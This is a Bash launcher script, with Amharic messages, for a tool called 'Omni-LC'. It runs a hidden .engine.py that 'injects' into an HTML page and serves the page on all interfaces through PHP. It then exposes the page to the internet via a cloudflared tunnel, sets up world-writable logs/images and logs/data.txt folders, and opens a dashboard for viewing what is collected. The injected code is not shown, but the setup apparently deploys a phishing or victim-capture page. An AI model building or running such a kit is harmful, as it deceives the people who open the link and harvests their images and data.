#!/bin/bash

# --- ቀለሞች እና ስታይል ---
CYAN='\033[0;36m'
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m' 
BOLD='\033[1m'

# --- የማጽጃ ፈንክሽን ---
cleanup() {
    echo -e "\n${RED}[!] ሲስተሙ እየተዘጋ ነው...${NC}"
    killall php cloudflared > /dev/null 2>&1
    exit
}
trap cleanup SIGINT

# --- 1. የ ASCII አርት እና Header (Fixed & Centered) ---
draw_header() {
    clear
    local cols=$(tput cols)
    
    # ASCII አርቱን በ "Here Document" በመጠቀም ከስህተት መጠበቅ
    local art_text=$(cat << 'EOF'
  /$$$$$$                          /$$         /$$        /$$$$$$ 
 /$$__  $$                        |__/        | $$       /$$__  $$
| $$  \ $$ /$$$$$$/$$$$  /$$$$$$$  /$$        | $$      | $$  \__/
| $$  | $$| $$_  $$_  $$| $$__  $$| $$ /$$$$$$| $$      | $$      
| $$  | $$| $$ \ $$ \ $$| $$  \ $$| $$|______/| $$      | $$      
| $$  | $$| $$ | $$ | $$| $$  | $$| $$        | $$      | $$    $$
|  $$$$$$/| $$ | $$ | $$| $$  | $$| $$        | $$$$$$$$|  $$$$$$/
 \______/ |__/ |__/ |__/|__/  |__/|__/        |________/ \______/ 
EOF
)

    echo -e "${CYAN}${BOLD}"
    # መስመር በመስመር መሃል ላይ ማድረግ
    while IFS= read -r line; do
        printf "%*s\n" $(( (${#line} + cols) / 2 )) "$line"
    done <<< "$art_text"
    
    local sub1="Developed by Andualem Koriya [ANK - አንኬ]"
    local sub2="Omni-LC Version: 4.0.1 (STABLE)"
    
    echo -e "${PURPLE}"
    printf "%*s\n" $(( (${#sub1} + cols) / 2 )) "$sub1"
    echo -e "${YELLOW}"
    printf "%*s\n" $(( (${#sub2} + cols) / 2 )) "$sub2"
    echo -e "${BLUE}"
    printf "%*s\n" $(( (44 + cols) / 2 )) "============================================"
    echo -e "${NC}"
}

# --- 2. የኔትወርክ እና አፕዴት ቼከር (Auto-Resume) ---
check_update() {
    echo -e "${BLUE}[*] የኔትወርክ ግንኙነት በመፈተሽ ላይ... 🌐${NC}"
    if ping -c 1 8.8.8.8 &> /dev/null; then
        echo -e "${GREEN}[+] ኢንተርኔት ተገኝቷል። አዲስ ማሻሻያ (Update) በማረጋገጥ ላይ... 🔄${NC}"
        
        git fetch &> /dev/null
        LOCAL=$(git rev-parse @)
        REMOTE=$(git rev-parse @{u})

        if [ "$LOCAL" != "$REMOTE" ]; then
            echo -e "${WHITE}${BOLD}[!] አዲስ ማሻሻያ ተገኝቷል! ሲስተሙን እያደስኩ ነው...${NC}"
            git reset --hard origin/main &> /dev/null
            echo -e "${GREEN}[✔] ሲስተሙ ታድሷል። ስራውን እየቀጠልኩ ነው...${NC}"
            # ፋይሉ ስለታደሰ አዲሱን run.sh መልሶ ያስጀምረዋል
            exec bash "$0" "$@"
        else
            echo -e "${GREEN}[✔] ሲስተሙ የቅርብ ጊዜ ማሻሻያ ላይ ነው (Up-to-date)።${NC}"
        fi
    else
        echo -e "${RED}[!] የኢንተርኔት ግንኙነት የለም። በአሮጌው ፋይል እቀጥላለሁ...${NC}"
    fi
}

# ዋናውን ስራ ማስጀመር
draw_header
check_update

echo -e "${BLUE}--------------------------------------------${NC}"

# --- 3. ኦሪጅናል ስራዎች (ቀጣይነት ያለው) ---
echo -e "${YELLOW}[*] ሲስተሙን በማዘጋጀት ላይ... 🛠️${NC}"
mkdir -p logs/images core
touch logs/data.txt
chmod -R 777 logs core
killall php > /dev/null 2>&1

echo -e -n "${GREEN}[?]${NC} የ HTML ፋይል ስም (default: index.html): "
read filename
filename=${filename:-index.html}

if [ ! -f "$filename" ]; then
    echo -e "${RED}[-][ERROR] $filename አልተገኘም!${NC}"
    exit 1
fi

echo -e -n "${GREEN}[?]${NC} የ Port ቁጥር (default: 8080): "
read port
port=${port:-8080}

echo -e "${YELLOW}[*] ኢንጄክሽን እየተከናወነ ነው... 💉${NC}"
python3 .engine.py "$filename"
echo -e "${GREEN}[+] ኢንጄክሽን ተጠናቋል።${NC}"

echo -e "${YELLOW}[*] የ PHP ሰርቨርን በ Port $port እያስነሳሁ ነው... 🚀${NC}"
php -S 0.0.0.0:$port > /dev/null 2>&1 &
sleep 2

echo -e "${BLUE}--------------------------------------------${NC}"
echo -e "${PURPLE}${BOLD}[!] የ CLOUDFLARE ሊንክ እየተፈጠረ ነው... ☁️${NC}"
echo -e "${BLUE}--------------------------------------------${NC}"

rm -f .cftunnel.log
cloudflared tunnel --url http://localhost:$port > .cftunnel.log 2>&1 &

echo -n -e "${YELLOW}[*] ሊንኩን በመፈለግ ላይ "
CF_URL=""
for i in {1..30}; do
    echo -n "."
    sleep 1
    CF_URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .cftunnel.log | head -n 1)
    if [ ! -z "$CF_URL" ]; then
        echo -e " ${GREEN}ተገኝቷል!${NC}"
        break
    fi
done

echo -e "\n"

if [ -z "$CF_URL" ]; then
    echo -e "${RED}[-] ስህተት፦ ሊንኩን ማመንጨት አልተቻለም።${NC}"
else
    echo -e "${GREEN}${BOLD}--------------------------------------------"
    echo -e "  ✅ ስራው ተጠናቋል! "
    echo -e "  🌐 የህዝብ ሊንክ: ${YELLOW}$CF_URL"
    echo -e "  📊 ዳሽቦርድ: ${CYAN}http://localhost:$port/core/dashboard.php"
    echo -e "${GREEN}--------------------------------------------${NC}"
    
    DASHBOARD_URL="http://localhost:$port/core/dashboard.php"
    if command -v termux-open-url &> /dev/null; then
        sleep 2
        termux-open-url "$DASHBOARD_URL"
    fi
fi

echo -e "${YELLOW}[i] ሲስተሙን ለማቆም CTRL+C ይጫኑ።${NC}"
wait
